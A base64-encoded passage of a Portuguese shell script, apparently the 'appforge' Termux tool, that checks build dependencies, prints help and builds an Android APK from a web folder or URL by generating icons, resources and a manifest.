4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAJHtOfVxuIgogIGlmIFsgIiRmYXRhbHMiIC1lcSAwIF0gJiYgWyAiJHdhcm5zIiAtZXEgMCBdOyB0aGVuCiAgICBwcmludGYgIiAgJHtCfVByb2pldG8gbGltcG8g4oCUICVkIHZlcmlmaWNhY29lcyBPSy4ke059XG5cbiIgIiRva3MiCiAgZWxpZiBbICIkZmF0YWxzIiAtZXEgMCBdOyB0aGVuCiAgICBwcmludGYgIiAgJHtZfSVkIGF2aXNvKHMpIOKAlCBwb2RlIGNvbXBpbGFyLiR7Tn1cbiAgJHtCfSVkIE9LJHtOfVxuXG4iICIkd2FybnMiICIkb2tzIgogIGVsc2UKICAgIHByaW50ZiAiICAke1J9JWQgZXJybyhzKSBmYXRhbChpcykuJHtOfVxuIiAiJGZhdGFscyIKICAgIHByaW50ZiAiICAke0J9JWQgT0ske059XG5cbiIgIiRva3MiCiAgZmkKfQpfY21kX2NoZWNrKCkgewogIGlmIFsgLW4gIiR7MTotfSIgXSAmJiBbIC1kICIkMSIgXTsgdGhlbiBfY21kX2NoZWNrX3Byb2plY3QgIiQxIjsgcmV0dXJuOyBmaQogIF9oZWFkICdhcHBmb3JnZSBjaGVjaycKICBsb2NhbCBvaz0xCiAgZm9yIGNtZCBpbiBhYXB0MiBlY2ogZHggYXBrc2lnbmVyIHppcGFsaWduIHB5dGhvbjMga2V5dG9vbDsgZG8KICAgIGNvbW1hbmQgLXYgIiRjbWQiID4vZGV2L251bGwgMj4mMSAmJiBfb2sgIiRjbWQiIHx8IHsgX3dhcm4gIiRjbWQgbmFvIGVuY29udHJhZG8iOyBvaz0wOyB9CiAgZG9uZQogIFsgLWYgIiRXMkFfSkFSIiBdICYmIF9vayAiYW5kcm9pZC5qYXIgLT4gJFcyQV9KQVIiIHx8IHsgX3dhcm4gJ2FuZHJvaWQuamFyIGF1c2VudGUgLS0geHBtIGluc3RhbGwgYXBwZm9yZ2UnOyBvaz0wOyB9CiAgY29tbWFuZCAtdiB0aW1nID4vZGV2L251bGwgMj4mMSAmJiBfb2sgInRpbWcgKGljb24gcHJldmlldykiIHx8IF93YXJuICJ0aW1nIGF1c2VudGUgKG9wY2lvbmFsKSAtLSBwa2cgaW5zdGFsbCB0aW1nIgogIGNvbW1hbmQgLXYgY3VybCA+L2Rldi9udWxsIDI+JjEgJiYgX29rICJjdXJsIChpY29uIGRvd25sb2FkKSIgfHwgX3dhcm4gImN1cmwgYXVzZW50ZSAtLSBwa2cgaW5zdGFsbCBjdXJsIgogIFsgIiRvayIgLWVxIDEgXSAmJiBwcmludGYgJ1xuXDAzM1sxOzMybSAgVHVkbyBwcm9udG8uXDAzM1swbVxuXG4nIHx8IHByaW50ZiAnXG5cMDMzWzE7MzNtICBJbnN0YWxlIG9zIGl0ZW5zIGFjaW1hLlwwMzNbMG1cblxuJwp9Cl9jbWRfaGVscCgpIHsKICBwcmludGYgJ1xuXDAzM1sxOzM1bSAgYXBwZm9yZ2UgdiVzIC0tIEVsbGlvdE9TIEhUTUwvQ1NTL0pTIDwtPiBBUEtcMDMzWzBtXG5cbicgIiRWRVJTSU9OIgogIHByaW50ZiAnICBcMDMzWzE7MzJtVXNvOlwwMzNbMG1cbicKICBwcmludGYgJyAgICBhcHBmb3JnZSBidWlsZCA8ZGlyPiBbb3Bjb2VzXSAgICAgXDAzM1swOzkwbSMgV2ViIC0+IEFQS1wwMzNbMG1cbicKICBwcmludGYgJyAgICBhcHBmb3JnZSBidWlsZCAtLXVybCA8aHR0cHM6Ly8uLi4+IFtvcGNvZXNdXG4nCiAgcHJpbnRmICcgICAgYXBwZm9yZ2UgYXBrMndlYiA8YXJxdWl2by5hcGs+IFtkaXJfc2FpZGFdXG4nCiAgcHJpbnRmICcgICAgYXBwZm9yZ2UgY2hlY2sgLyBhcHBmb3JnZSBjaGVjayA8ZGlyPlxuXG4nCiAgcHJpbnRmICcgIFwwMzNbMTszMm1PcGNvZXMgZGUgYnVpbGQ6XDAzM1swbVxuJwogIHByaW50ZiAnICAgIC0tbmFtZSAiTm9tZSIgICAgICAgICAgTm9tZSBleGliaWRvXG4nCiAgcHJpbnRmICcgICAgLS1wa2duYW1lIGNvbS5wa2cuaWQgICBQYWNrYWdlIElEXG4nCiAgcHJpbnRmICcgICAgLS1pY29uIC9wYXRoL2ljb24gICAgICBJY29uZSAocHJpb3JpZGFkZSBtYXhpbWEpXG4nCiAgcHJpbnRmICcgICAgLS1pY29uLXNlYXJjaCA8dGVybW8+ICBCdXNjYSBpY29uZSBpbnRlcmF0aXZhbWVudGVcbicKICBwcmludGYgJyAgICAtLWljb24tYXV0byAgICAgICAgICAgIERlc2NvYnJlIGZhdmljb24vbG9nbyBkbyBzaXRlXG4nCiAgcHJpbnRmICcgICAgLS1vdXQgL3BhdGgvYXBwLmFwayAgICBTYWlkYVxuJwogIHByaW50ZiAnICAgIC0tcGVybSBjYW0sbWljLC4uLiAgICAgUGVybWlzc29lc1xuJwogIHByaW50ZiAnICAgIC0tdmVyc2lvbiAiMS4wIiAgICAgICAgVmVyc2lvbiBuYW1lXG4nCiAgcHJpbnRmICcgICAgLS12ZXJzaW9uY29kZSBOICAgICAgICBWZXJzaW9uIGNvZGVcbicKICBwcmludGYgJyAgICAtLW1pbi1zZGsgTiAgICAgICAgICAgIE1pbiBTREsgKHBhZHJhbyAyMSlcbicKICBwcmludGYgJyAgICAtLXRhcmdldC1zZGsgTiAgICAgICAgIFRhcmdldCBTREsgKHBhZHJhbyAzMylcbicKICBwcmludGYgJyAgICAtLW9yaWVudGF0aW9uIHBvcnRyYWl0fGxhbmRzY2FwZXxhdXRvXG4nCiAgcHJpbnRmICcgICAgLS1mdWxsc2NyZWVuICAgICAgICAgICBFc2NvbmRlIHN0YXR1cyBiYXJcbicKICBwcmludGYgJyAgICAtLXRoZW1lIGRhcmt8bGlnaHR8dHJhbnNwYXJlbnRcbicKICBwcmludGYgJyAgICAtLXVybCBodHRwczovLy4uLiAgICAgIENhcnJlZ2EgVVJMIHJlbW90YVxuJwogIHByaW50ZiAnICAgIC0tbm8taW50ZXJuZXQgICAgICAgICAgU2VtIElOVEVSTkVUIGF1dG9tYXRpY2FcblxuJwogIHByaW50ZiAnICBcMDMzWzE7MzJtUHJpb3JpZGFkZSBkZSBpY29uZTpcMDMzWzBtXG4nCiAgcHJpbnRmICcgICAgMS4gLS1pY29uICAyLiAtLWljb24tYXV0byAgMy4gLS1pY29uLXNlYXJjaCAgNC4gcGxhY2Vob2xkZXJcblxuJwogIHByaW50ZiAnICBcMDMzWzE7MzJtSWNvbmVzIHN0YW5kYWxvbmU6XDAzM1swbVxuJwogIHByaW50ZiAnICAgIFwwMzNbMDs5MG1hZiBpY29uIHNlYXJjaCA8dGVybW8+ICAvICBhZiBpY29uIGNsZWFuIFstLWZvcmNlXVwwMzNbMG1cblxuJwogIHByaW50ZiAnICBcMDMzWzE7MzJtRXhlbXBsb3M6XDAzM1swbVxuJwogIHByaW50ZiAnICAgIFwwMzNbMDs5MG1hcHBmb3JnZSBidWlsZCAuL2FwcC8gLS1uYW1lICJBcHAiIC0tcGVybSBpbnRlcm5ldCxjYW1lcmFcMDMzWzBtXG4nCiAgcHJpbnRmICcgICAgXDAzM1swOzkwbWFwcGZvcmdlIGJ1aWxkIC0tdXJsIGh0dHBzOi8vZ2l0aHViLmNvbSAtLW5hbWUgIkdpdEh1YiIgLS1pY29uLXNlYXJjaCBnaXRodWJcMDMzWzBtXG4nCiAgcHJpbnRmICcgICAgXDAzM1swOzkwbWFwcGZvcmdlIGJ1aWxkIC0tdXJsIGh0dHBzOi8veW91dHViZS5jb20gLS1pY29uLWF1dG9cMDMzWzBtXG4nCiAgcHJpbnRmICcgICAgXDAzM1swOzkwbWFwcGZvcmdlIGFwazJ3ZWIgTWV1QXBwLmFwa1wwMzNbMG1cblxuJwp9Cl9jbWRfYnVpbGQoKSB7CiAgbG9jYWwgU1JDX0RJUj0nJyBMT0FEX1VSTD0nJyBBUFBfTkFNRT0nJyBQS0dfTkFNRT0nJyBJQ09OX1NSQz0nJwogIGxvY2FsIElDT05fU0VBUkNIX1RFUk09JycgSUNPTl9BVVRPPTAKICBsb2NhbCBPVVRfQVBLPScnIFBFUk1TPScnIFZFUlNJT05fTkFNRT0nMS4wLjAnIFZFUlNJT05fQ09ERT0xCiAgbG9jYWwgTUlOX1NESz0yMSBUQVJHRVRfU0RLPTMzIE9SSUVOVEFUSU9OPSd1bnNwZWNpZmllZCcKICBsb2NhbCBGVUxMU0NSRUVOPTAgVEhFTUU9J2xpZ2h0JyBOT19JTlRFUk5FVD0wCiAgd2hpbGUgWyAkIyAtZ3QgMCBdOyBkbwogICAgY2FzZSAiJDEiIGluCiAgICAgIC0tdXJsKSAgICAgICAgICBMT0FEX1VSTD0iJDIiOyAgICAgICAgICBzaGlmdCAyIDs7CiAgICAgIC0tbmFtZSkgICAgICAgICBBUFBfTkFNRT0iJDIiOyAgICAgICAgICBzaGlmdCAyIDs7CiAgICAgIC0tcGtnbmFtZSkgICAgICBQS0dfTkFNRT0iJDIiOyAgICAgICAgICBzaGlmdCAyIDs7CiAgICAgIC0taWNvbikgICAgICAgICBJQ09OX1NSQz0iJDIiOyAgICAgICAgICBzaGlmdCAyIDs7CiAgICAgIC0taWNvbi1zZWFyY2gpICBJQ09OX1NFQVJDSF9URVJNPSIkMiI7ICBzaGlmdCAyIDs7CiAgICAgIC0taWNvbi1hdXRvKSAgICBJQ09OX0FVVE89MTsgICAgICAgICAgICBzaGlmdCA7OwogICAgICAtLW91dCkgICAgICAgICAgT1VUX0FQSz0iJDIiOyAgICAgICAgICAgc2hpZnQgMiA7OwogICAgICAtLXBlcm18LS1wZXJtcykgUEVSTVM9IiRQRVJNUywkMiI7ICAgICAgc2hpZnQgMiA7OwogICAgICAtLXZlcnNpb24pICAgICAgVkVSU0lPTl9OQU1FPSIkMiI7ICAgICAgc2hpZnQgMiA7OwogICAgICAtLXZlcnNpb25jb2RlKSAgVkVSU0lPTl9DT0RFPSIkMiI7ICAgICAgc2hpZnQgMiA7OwogICAgICAtLW1pbi1zZGspICAgICAgTUlOX1NESz0iJDIiOyAgICAgICAgICAgc2hpZnQgMiA7OwogICAgICAtLXRhcmdldC1zZGspICAgVEFSR0VUX1NESz0iJDIiOyAgICAgICAgc2hpZnQgMiA7OwogICAgICAtLW9yaWVudGF0aW9uKSAgT1JJRU5UQVRJT049IiQyIjsgICAgICAgc2hpZnQgMiA7OwogICAgICAtLWZ1bGxzY3JlZW4pICAgRlVMTFNDUkVFTj0xOyAgICAgICAgICAgc2hpZnQgOzsKICAgICAgLS10aGVtZSkgICAgICAgIFRIRU1FPSIkMiI7ICAgICAgICAgICAgIHNoaWZ0IDIgOzsKICAgICAgLS1uby1pbnRlcm5ldCkgIE5PX0lOVEVSTkVUPTE7ICAgICAgICAgIHNoaWZ0IDs7CiAgICAgIC0tKikgICAgICAgICAgICBfd2FybiAiT3BjYW8gZGVzY29uaGVjaWRhOiAkMSI7IHNoaWZ0IDs7CiAgICAgICopIFsgLXogIiRTUkNfRElSIiBdICYmIFsgLXogIiRMT0FEX1VSTCIgXSAmJiBTUkNfRElSPSIkMSI7IHNoaWZ0IDs7CiAgICBlc2FjCiAgZG9uZQogICMgTm9ybWFsaXphIFVSTAogIGlmIFsgLW4gIiRMT0FEX1VSTCIgXTsgdGhlbgogICAgY2FzZSAiJExPQURfVVJMIiBpbiBodHRwOi8vKnxodHRwczovLyopIDo7OyAqKSBMT0FEX1VSTD0iaHR0cHM6Ly8kTE9BRF9VUkwiOzsgZXNhYwogIGZpCiAgWyAtZiAiJFcyQV9KQVIiIF0gfHwgX2VyciAnYW5kcm9pZC5qYXIgYXVzZW50ZS4gRXhlY3V0ZTogeHBtIGluc3RhbGwgYXBwZm9yZ2UnCiAgaWYgWyAteiAiJExPQURfVVJMIiBdOyB0aGVuCiAgICBbIC16ICIkU1JDX0RJUiIgXSAmJiB7IF9jbWRfaGVscDsgZXhpdCAxOyB9CiAgICBbIC1kICIkU1JDX0RJUiIgXSB8fCBfZXJyICJEaXJldG9yaW8gbmFvIGVuY29udHJhZG86ICRTUkNfRElSIgogICAgWyAtZiAiJFNSQ19ESVIvaW5kZXguaHRtbCIgXSB8fCBfd2FybiAnaW5kZXguaHRtbCBuYW8gZW5jb250cmFkbycKICBmaQogIGxvY2FsIERJUl9CQVNFOyBESVJfQkFTRT0kKGJhc2VuYW1lICIke1NSQ19ESVIlL30iKQogIFsgLXogIiRBUFBfTkFNRSIgXSAmJiBBUFBfTkFNRT0iJHtESVJfQkFTRTotV2ViQXBwfSIKICBsb2NhbCBQS0dfU0FGRTsgUEtHX1NBRkU9JChwcmludGYgJyVzJyAiJEFQUF9OQU1FIiB8IHRyICdBLVonICdhLXonIHwgc2VkICdzL1teYS16MC05XS9fL2c7cy9fXyovXy9nJykKICBbIC16ICIkUEtHX05BTUUiIF0gJiYgUEtHX05BTUU9ImNvbS5lbGxpb3Rvcy53ZWJhcGsuJHtQS0dfU0FGRX0iCiAgWyAteiAiJE9VVF9BUEsiICBdICYmIE9VVF9BUEs9IiR7QVBQX05BTUUvLyAvX30uYXBrIgogIFsgIiROT19JTlRFUk5FVCIgLWVxIDAgXSAmJiBQRVJNUz0iaW50ZXJuZXQsJFBFUk1TIgogIF9oZWFkICdhcHBmb3JnZSBidWlsZCcKICBfaW5mbyAiQXBwICAgICA6ICRBUFBfTkFNRSIKICBfaW5mbyAiUGFja2FnZSA6ICRQS0dfTkFNRSIKICBfaW5mbyAiU2FpZGEgICA6ICRPVVRfQVBLIgogIFsgLW4gIiRMT0FEX1VSTCIgXSAmJiBfaW5mbyAiVVJMICAgICA6ICRMT0FEX1VSTCIKICBbIC1uICIkU1JDX0RJUiIgIF0gJiYgX2luZm8gIkZvbnRlICAgOiAkU1JDX0RJUiIKICAjIFByaW9yaWRhZGUgZGUgw61jb25lCiAgbG9jYWwgX1RNUF9SRVNVTFQ7IF9UTVBfUkVTVUxUPSQobWt0ZW1wKQogIGlmIFsgLW4gIiRJQ09OX1NSQyIgXSAmJiB7IFsgLW4gIiRJQ09OX1NFQVJDSF9URVJNIiBdIHx8IFsgIiRJQ09OX0FVVE8iIC1lcSAxIF07IH07IHRoZW4KICAgIF93YXJuICItLWljb24gdGVtIHByaW9yaWRhZGUg4oCUIGlnbm9yYW5kbyAtLWljb24tc2VhcmNoLy0taWNvbi1hdXRvIgogICAgSUNPTl9TRUFSQ0hfVEVSTT0iIjsgSUNPTl9BVVRPPTAKICBmaQogIGlmIFsgIiRJQ09OX0FVVE8iIC1lcSAxIF0gJiYgWyAteiAiJElDT05fU1JDIiBdOyB0aGVuCiAgICBsb2NhbCBfQVVUT19UTVA7IF9BVVRPX1RNUD0kKF9pY29uX21rdGVtcF9kaXIpCiAgICBpZiBbIC1uICIkX0FVVE9fVE1QIiBdOyB0aGVuCiAgICAgIGxvY2FsIF9BVVRPX1I7IF9BVVRPX1I9JChfaWNvbl9hdXRvX2Rpc2NvdmVyICIke0xPQURfVVJMOi1odHRwczovL2V4YW1wbGUuY29tfSIgIiRfQVVUT19UTVAiKQogICAgICBpZiBwcmludGYgJyVzJyAiJF9BVVRPX1IiIHwgZ3JlcCAtcSAnXm9rOic7IHRoZW4KICAgICAgICBsb2NhbCBfQVVUT19SQVc7IF9BVVRPX1JBVz0kKHByaW50ZiAnJXMnICIkX0FVVE9fUiIgfCBncmVwICdeb2s6JyB8IGhlYWQgLTEgfCBjdXQgLWQ6IC1mMi0pCiAgICAgICAgbG9jYWwgX0FVVE9fRklOQUw9IiRfQVVUT19UTVAvc2VsZWN0ZWQucG5nIgogICAgICAgIGlmIF9pY29uX3RvX3BuZyAiJF9BVVRPX1JBVyIgIiRfQVVUT19GSU5BTCIgMTkyOyB0aGVuCiAgICAgICAgICBJQ09OX1NSQz0iJF9BVVRPX0ZJTkFMIjsgX29rICJJY29uZSBhdXRvbWF0aWNvOiAkSUNPTl9TUkMiCiAgICAgICAgZmkKICAgICAgZWxzZQogICAgICAgIF93YXJuICJJY29uZSBhdXRvbWF0aWNvIG5hbyBlbmNvbnRyYWRvIgogICAgICBmaQogICAgZmkKICBmaQogIGlmIFsgLW4gIiRJQ09OX1NFQVJDSF9URVJNIiBdICYmIFsgLXogIiRJQ09OX1NSQyIgXTsgdGhlbgogICAgaWYgX2ljb25fc2VhcmNoX2FuZF9zZWxlY3QgIiRJQ09OX1NFQVJDSF9URVJNIiAiJF9UTVBfUkVTVUxUIjsgdGhlbgogICAgICBJQ09OX1NSQz0kKGNhdCAiJF9UTVBfUkVTVUxUIiAyPi9kZXYvbnVsbCkKICAgICAgWyAtbiAiJElDT05fU1JDIiBdICYmIF9vayAiSWNvbmUgc2VsZWNpb25hZG86ICRJQ09OX1NSQyIKICAgIGVsc2UKICAgICAgX3dhcm4gIkJ1c2NhIGNhbmNlbGFkYSDigJQgc2VtIGljb25lIHBlcnNvbmFsaXphZG8iCiAgICBmaQogIGZpCiAgcm0gLWYgIiRfVE1QX1JFU1VMVCIKICBsb2NhbCBCVUlMRAogIEJVSUxEPSQobWt0ZW1wIC1kIC9kYXRhL2RhdGEvY29tLnRlcm11eC9maWxlcy91c3IvdG1wL2FwcGZvcmdlLlhYWFhYWCAyPi9kZXYvbnVsbCkgXAogICAgfHwgQlVJTEQ9JChta3RlbXAgLWQgIiRIT01FLy54cG0vYXBwZm9yZ2UvYnVpbGQuWFhYWFhYIikKICB0cmFwICdybSAtcmYgIiRCVUlMRCInIEVYSVQKICBsb2NhbCBQS0dfUEFUSDsgUEtHX1BBVEg9JChwcmludGYgJyVzJyAiJFBLR19OQU1FIiB8IHRyICcuJyAnLycpCiAgbWtkaXIgLXAgIiRCVUlMRC9zcmMvJFBLR19QQVRIIiAiJEJVSUxEL2NsYXNzZXMiICIkQlVJTEQvcmVzX2NvbXBpbGVkIiBcCiAgICAgICAgICAgIiRCVUlMRC9yZXMvdmFsdWVzIiAiJEJVSUxEL3Jlcy94bWwiICIkQlVJTEQvYXNzZXRzL3d3dyIgXAogICAgICAgICAgICIkQlVJTEQvcmVzL2RyYXdhYmxlLW1kcGkiICAiJEJVSUxEL3Jlcy9kcmF3YWJsZS1oZHBpIiBcCiAgICAgICAgICAgIiRCVUlMRC9yZXMvZHJhd2FibGUteGhkcGkiICIkQlVJTEQvcmVzL2RyYXdhYmxlLXh4aGRwaSIgXAogICAgICAgICAgICIkQlVJTEQvcmVzL2RyYXdhYmxlLXh4eGhkcGkiCiAgX2luZm8gJ1ByZXBhcmFuZG8gaWNvbmUuLi4nCiAgaWYgWyAtbiAiJElDT05fU1JDIiBdICYmIFsgLWYgIiRJQ09OX1NSQyIgXTsgdGhlbgogICAgX2RpbSAiRm9udGU6ICRJQ09OX1NSQyIKICAgIGxvY2FsIF9JQ09OX1BORz0iJElDT05fU1JDIgogICAgbG9jYWwgX0ZNVF9TUkM7IF9GTVRfU1JDPSQoX2ljb25fZGV0ZWN0X2Zvcm1hdCAiJElDT05fU1JDIikKICAgIGlmIFsgIiRfRk1UX1NSQyIgIT0gInBuZyIgXTsgdGhlbgogICAgICBsb2NhbCBfVE1QX1BORzsgX1RNUF9QTkc9JChta3RlbXAgL3RtcC9hZl9pY29uX1hYWFhYWC5wbmcpCiAgICAgIF9pY29uX3RvX3BuZyAiJElDT05fU1JDIiAiJF9UTVBfUE5HIiAxOTIgJiYgX0lDT05fUE5HPSIkX1RNUF9QTkciCiAgICBmaQogICAgX3Jlc2l6ZV9pY29uICIkX0lDT05fUE5HIiAiJEJVSUxEL3Jlcy9kcmF3YWJsZS1tZHBpL2ljb24ucG5nIiAgICA0OAogICAgX3Jlc2l6ZV9pY29uICIkX0lDT05fUE5HIiAiJEJVSUxEL3Jlcy9kcmF3YWJsZS1oZHBpL2ljb24ucG5nIiAgICA3MgogICAgX3Jlc2l6ZV9pY29uICIkX0lDT05fUE5HIiAiJEJVSUxEL3Jlcy9kcmF3YWJsZS14aGRwaS9pY29uLnBuZyIgICA5NgogICAgX3Jlc2l6ZV9pY29uICIkX0lDT05fUE5HIiAiJEJVSUxEL3Jlcy9kcmF3YWJsZS14eGhkcGkvaWNvbi5wbmciICAxNDQKICAgIF9yZXNpemVfaWNvbiAiJF9JQ09OX1BORyIgIiRCVUlMRC9yZXMvZHJhd2FibGUteHh4aGRwaS9pY29uLnBuZyIgMTkyCiAgICBfb2sgIkljb25lIHJlZGltZW5zaW9uYWRvIChtZHBpL2hkcGkveGhkcGkveHhoZHBpL3h4eGhkcGkpIgogIGVsc2UKICAgIFsgLW4gIiRJQ09OX1NSQyIgXSAmJiBfd2FybiAiSWNvbmUgbmFvIGVuY29udHJhZG86ICRJQ09OX1NSQyIKICAgIGZvciBkIGluIG1kcGkgaGRwaSB4aGRwaSB4eGhkcGkgeHh4aGRwaTsgZG8gX2dlbl9pY29uICIkQlVJTEQvcmVzL2RyYXdhYmxlLSR7ZH0vaWNvbi5wbmciOyBkb25lCiAgZmkKICBbIC1uICIkU1JDX0RJUiIgXSAmJiBbIC1kICIkU1JDX0RJUiIgXSAmJiB7CiAgICBjcCAtciAiJFNSQ19ESVIiLy4gIiRCVUlMRC9hc3NldHMvd3d3LyIKICAgIGxvY2FsIF9udCBfbmggX25jIF9uagogICAgX250PSQoZmluZCAiJEJVSUxEL2Fzc2V0cy93d3ciIC10eXBlIGYgfCB3YyAtbCkKICAgIF9uaD0kKGZpbmQgIiRCVUlMRC9hc3NldHMvd3d3IiAtdHlwZSBmIC1pbmFtZSAiKi5odG1sIiB8IHdjIC1sKQogICAgX25jPSQoZmluZCAiJEJVSUxEL2Fzc2V0cy93d3ciIC10eXBlIGYgLWluYW1lICIqLmNzcyIgIHwgd2MgLWwpCiAgICBfbmo9JChmaW5kICIkQlVJTEQvYXNzZXRzL3d3dyIgLXR5cGUgZiAtaW5hbWUgIiouanMiICAgfCB3YyAtbCkKICAgIF9pbmZvICJBc3NldHM6ICRfbnQgYXJxdWl2b3MgKCRfbmggSFRNTCwgJF9uYyBDU1MsICRfbmogSlMpIgogICAgaWYgWyAhIC1mICIkQlVJTEQvYXNzZXRzL3d3dy9pbmRleC5odG1sIiBdOyB0aGVuCiAgICAgIGxvY2FsIF9maDsgX2ZoPSQoZmluZCAiJEJVSUxEL2Fzc2V0cy93d3ciIC10eXBlIGYgLWluYW1lICIqLmh0bWwiIHwgaGVhZCAtMSkKICAgICAgWyAtbiAiJF9maCIgXSAmJiBKQVZBX0xPQURfRkFMTEJBQ0s9ImZpbGU6Ly8vYW5kcm9pZF9hc3NldC93d3cvJChiYXNlbmFtZSAiJF9maCIpIiBcCiAgICAgICAgICAgICAgICAgICAgfHwgSkFWQV9MT0FEX0ZBTExCQUNLPSdmaWxlOi8vL2FuZHJvaWRfYXNzZXQvd3d3L2luZGV4Lmh0bWwnCiAgICBmaQogIH0KICBleHBvcnQgVzJBX0FQUD0iJEFQUF9OQU1FIiBXMkFfQlVJTEQ9IiRCVUlMRCIKICBweXRob24zIC1jICIKaW1wb3J0IG9zCmFwcD1vcy5lbnZpcm9uLmdldCgnVzJBX0FQUCcsJ0FwcCcpOyBvdXQ9b3MuZW52aXJvbi5nZXQoJ1cyQV9CVUlMRCcsJycpKycvcmVzL3ZhbHVlcy9zdHJpbmdzLnhtbCcKYXBwPWFwcC5yZXBsYWNlKCcmJywnJmFtcDsnKS5yZXBsYWNlKCc8JywnJmx0OycpLnJlcGxhY2UoJz4nLCcmZ3Q7JykucmVwbGFjZSgnXCInLCcmcXVvdDsnKQpvcGVuKG91dCwndycpLndyaXRlKCc8P3htbCB2ZXJzaW9uPVwiMS4wXCIgZW5jb2Rpbmc9XCJ1dGYtOFwiPz5cbjxyZXNvdXJjZXM+XG4gICAgPHN0cmluZyBuYW1lPVwiYXBwX25hbWVcIj4nK2FwcCsnPC9zdHJpbmc+XG48L3Jlc291cmNlcz5cbicpCiIKICBjYXQgPiAiJEJVSUxEL3Jlcy94bWwvbmV0d29ya19zZWN1cml0eV9jb25maWcueG1sIiA8PCAnTlNFT0YnCjw/eG1sIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9InV0Zi04Ij8+CjxuZXR3b3JrLXNlY3VyaXR5LWNvbmZpZz4KICAgIDxiYXNlLWNvbmZpZyBjbGVhcnRleHRUcmFmZmljUGVybWl0dGVkPSJ0cnVlIj4KICAgICAgICA8dHJ1c3QtYW5jaG9ycz48Y2VydGlmaWNhdGVzIHNyYz0ic3lzdGVtIi8+PC90cnVzdC1hbmNob3JzPgogICAgPC9iYXNlLWNvbmZpZz4KPC9uZXR3b3JrLXNlY3VyaXR5LWNvbmZpZz4KTlNFT0YKICBsb2NhbCBQRVJNU19MSVNUCiAgUEVSTVNfTElTVD0kKHByaW50ZiAnJXMnICIkUEVSTVMiIHwgdHIgJywnICdcbicgfCB3aGlsZSByZWFkIC1yIHA7IGRvIF9wZXJtX3Jlc29sdmUgIiRwIjsgZG9uZSB8IHNvcnQgLXUgfCB0ciAnXG4nICd8JykKICBsb2NhbCBPUklFTlRfQU5EUk9JRD0ndW5zcGVjaWZpZWQnCiAgY2FzZSAiJE9SSUVOVEFUSU9OIiBpbiBwb3J0cmFpdCkgT1JJRU5UX0FORFJPSUQ9J3BvcnRyYWl0Jzs7IGxhbmRzY2FwZSkgT1JJRU5UX0FORFJPSUQ9J2xhbmRzY2FwZSc7OyBhdXRvKSBPUklFTlRfQU5EUk9JRD0nZnVsbFNlbnNvcic7OyBlc2FjCiAgZXhwb3J0IFcyQV9QS0c9IiRQS0dfTkFNRSIgVzJBX1ZDPSIkVkVSU0lPTl9DT0RFIiBXMkFfVk49IiRWRVJTSU9OX05BTUUiIFwKICAgICAgICAgVzJBX01JTlNESz0iJE1JTl9TREsiIFcyQV9UR1RTREs9IiRUQVJHRVRfU0RLIiBcCiAgICAgICAgIFcyQV9PUklFTlQ9IiRPUklFTlRfQU5EUk9JRCIgVzJBX1BFUk1TPSIkUEVSTVNfTElTVCIKICBweXRob24zIC1jICIKaW1wb3J0IG9zCmJ1aWxkPW9zLmVudmlyb25bJ1cyQV9CVUlMRCddO3BrZz1vcy5lbnZpcm9uWydXMkFfUEtHJ107dmM9b3MuZW52aXJvblsnVzJBX1ZDJ10Kdm49b3MuZW52aXJvblsnVzJBX1ZOJ107bWluc2RrPW9zLmVudmlyb25bJ1cyQV9NSU5TREsnXTt0Z3RzZGs9b3MuZW52aXJvblsnVzJBX1RHVFNESyddCm9yaWVudD1vcy5lbnZpcm9uWydXMkFfT1JJRU5UJ107cGVybXM9W3AgZm9yIHAgaW4gb3MuZW52aXJvblsnVzJBX1BFUk1TJ10uc3BsaXQoJ3wnKSBpZiBwXQpweG1sPScnLmpvaW4oJyAgICA8dXNlcy1wZXJtaXNzaW9uIGFuZHJvaWQ6bmFtZT1cIicrcCsnXCIvPlxuJyBmb3IgcCBpbiBwZXJtcykKeG1sPSgnPD94bWwgdmVyc2lvbj1cIjEuMFwiIGVuY29kaW5nPVwidXRmLThcIj8+XG48bWFuaWZlc3QgeG1sbnM6YW5kcm9pZD1cImh0dHA6Ly9zY2hlbWFzLmFuZHJvaWQuY29tL2Fway9yZXMvYW5kcm9pZFwiXG4nCiAgICAgJyAgICBwYWNrYWdlPVwiJytwa2crJ1wiIGFuZHJvaWQ6dmVyc2lvbkNvZGU9XCInK3ZjKydcIiBhbmRyb2lkOnZlcnNpb25OYW1lPVwiJyt2bisnXCI+XG4nCiAgICAgJyAgICA8dXNlcy1zZGsgYW5kcm9pZDptaW5TZGtWZXJzaW9uPVwiJyttaW5zZGsrJ1wiIGFuZHJvaWQ6dGFyZ2V0U2RrVmVyc2lvbj1cIicrdGd0c2RrKydcIi8+XG4nCiAgICAgK3B4bWwrCiAgICAgJyAgICA8YXBwbGljYXRpb24gYW5kcm9pZDpsYWJlbD1cIkBzdHJpbmcvYXBwX25hbWVcIiBhbmRyb2lkOmljb249XCJAZHJhd2FibGUvaWNvblwiXG4nCiAgICAgJyAgICAgICAgYW5kcm9pZDpoYXJkd2FyZUFjY2VsZXJhdGVkPVwidHJ1ZVwiIGFuZHJvaWQ6dXNlc0NsZWFydGV4dFRyYWZmaWM9XCJ0cnVlXCJcbicKICAgICAnICAgICAgICBhbmRyb2lkOm5ldHdvcmtTZWN1cml0eUNvbmZpZz1cIkB4bWwvbmV0d29ya19zZWN1cml0eV9jb25maWdcIj5cbicKICAgICAnICAgICAgICA8YWN0aXZpdHkgYW5kcm9pZDpuYW1lPVwiLldlYkFjdGl2aXR5XCIgYW5kcm9pZDpleHBvcnRlZD1cInRydWVcIlxuJwogICAgICcgICAgICAgICAgICBhbmRyb2lkOnNjcmVlbk9yaWVudGF0aW9uPVwiJytvcmllbnQrJ1wiXG4nCiAgICAgJyAgICAgICAgICAgIGFuZHJvaWQ6Y29uZmlnQ2hhbmdlcz1cIm9yaWVudGF0aW9ufHNjcmVlblNpemV8a2V5Ym9hcmRIaWRkZW5cIj5cbicKICAgICAnICAgICAgICAgICAgPGludGVudC1maWx0ZXI+XG4nCiAgICAgJyAgICAgICAgICAgICAgICA8YWN0aW9uIGFuZHJvaWQ6bmFtZT1cImFuZHJvaWQuaW50ZW50LmFjdGlvbi5NQUlOXCIvPlxuJwogICAgICcgICAgICAgICAgICAgICAgPGNhdGVnb3J5IGFuZHJvaWQ6bmFtZT1cImFuZHJvaWQuaW50ZW50LmNhdGVnb3J5LkxBVU5DSEVSXCIvPlxuJwogICAgICcgICAgICAgICAgICA8L2ludGVudC1maWx0ZXI+XG4nCiAgICAgJyAgICAgICAgPC9hY3Rpdml0eT5cbiAgICA8L2FwcGxpY2F0aW